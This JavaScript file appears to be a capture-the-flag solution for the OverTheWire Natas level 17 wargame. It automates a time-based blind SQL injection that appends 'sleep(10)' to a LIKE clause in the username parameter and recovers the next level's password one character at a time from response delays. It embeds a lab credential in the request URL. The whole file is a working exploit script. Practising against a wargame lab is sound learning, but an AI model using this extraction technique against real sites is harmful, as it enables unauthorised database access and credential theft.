import request from "request";

const START = '';

let allChars = "";
for(var i=32;i<127;++i) allChars += String.fromCharCode(i);
allChars = allChars.replace('%', '').replace('_', '');
console.log('Chars to check: ', allChars);

const checkPassword = (attempt) => {
  return new Promise((resolve) => {
    const foo = `natas18" and password like binary '${attempt}%' and sleep(10)#`;
    let uri = `http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/index.php?debug=true&username=${encodeURIComponent(foo)}`;
    console.log('Testing URI: '+uri);
    console.log(' - query: '+foo);
    const startTime = Date.now();
    request.get(uri, (error, response, body) => {
      if (error) {
        console.log("got error " + error);
        resolve(false);
      }

      if (response.statusCode === 200) {
        let requestTime = Date.now() - startTime;
        console.log('request time: '+requestTime);
        if (requestTime > 10000) {
          resolve(true);
          return;
        }
      }
      resolve(false);
    });
  });
};

async function findPassword() {
  return new Promise(async resolve => {
    let password = START;
    let gotResult = false;
    do {
      for (const char of allChars.split("")) {
        gotResult = await checkPassword(password + char);
        if (gotResult) {
          password += char;
          break;
        }
      }
    } while (gotResult);

    resolve(password);
  });
}

async function start() {
  const password = await findPassword();
  console.log("Found password: " + password);
}

start();
